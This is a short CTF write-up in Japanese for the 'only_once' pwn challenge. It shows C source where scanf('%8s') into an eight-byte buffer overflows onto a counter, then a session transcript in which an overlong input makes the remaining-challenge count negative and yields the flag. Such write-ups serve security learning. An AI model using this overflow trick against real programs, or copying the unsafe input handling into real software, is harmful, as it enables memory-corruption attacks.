# only_once (pwn)

## 問題概要
バイナリとソースコードが与えられる
```
$ nc only-once-pwn.wanictf.org 9002

+---------------------------------------+
| your score: 0, remaining 1 challenges |
+---------------------------------------+

694 + 804 = 1498
Cool!

+---------------------------------------+
| your score: 1, remaining 0 challenges |
+---------------------------------------+

Bye!
```

## 解法
以下のようなコードになっており、明らかにオーバーフローする
```c
  int score = 0, chall = 1;
  char buf[8];

  while (1) {
    printf("\n+---------------------------------------+\n");
    printf("| your score: %d, remaining %d challenges |\n", score, chall);
    printf("+---------------------------------------+\n\n");

    if (chall == 0) {
      printf("Bye!\n");
      break;
    }
    printf("%3d + %3d = ", x, y);
    scanf("%8s", buf);
```

適当にオーバーフローさせると残りのチャレンジ数が負になっているので、その状態で3回正解するとフラグがもらえる
```
$ nc only-once-pwn.wanictf.org 9002

+---------------------------------------+
| your score: 0, remaining 1 challenges |
+---------------------------------------+

497 + 439 = 1111111111111111111111111111111111111111111111111111111111111111111111111
Oops...

+---------------------------------------+
| your score: 0, remaining -1 challenges |
+---------------------------------------+

863 +  83 = Oops...

+---------------------------------------+
| your score: 0, remaining -257 challenges |
+---------------------------------------+

468 + 585 = Oops...

+---------------------------------------+
| your score: 0, remaining -513 challenges |
+---------------------------------------+

430 + 508 = Oops...

+---------------------------------------+
| your score: 0, remaining -769 challenges |
+---------------------------------------+

 31 + 185 = Oops...

+---------------------------------------+
| your score: 0, remaining -1025 challenges |
+---------------------------------------+

 73 + 234 = Oops...

+---------------------------------------+
| your score: 0, remaining -1281 challenges |
+---------------------------------------+

553 + 315 = Oops...

+---------------------------------------+
| your score: 0, remaining -1537 challenges |
+---------------------------------------+

126 + 521 = Oops...

+---------------------------------------+
| your score: 0, remaining -1793 challenges |
+---------------------------------------+

867 +  65 = Oops...

+---------------------------------------+
| your score: 0, remaining -2049 challenges |
+---------------------------------------+

170 + 536 = Oops...

+---------------------------------------+
| your score: 0, remaining -2050 challenges |
+---------------------------------------+

995 + 820 = 1815
Cool!

+---------------------------------------+
| your score: 1, remaining -2051 challenges |
+---------------------------------------+

614 + 469 = 1083
Cool!

+---------------------------------------+
| your score: 2, remaining -2052 challenges |
+---------------------------------------+

159 + 540 = 699
Cool!
Congrats!
cat FLAG
FLAG{y0u_4r3_600d_47_c41cu14710n5!}
```
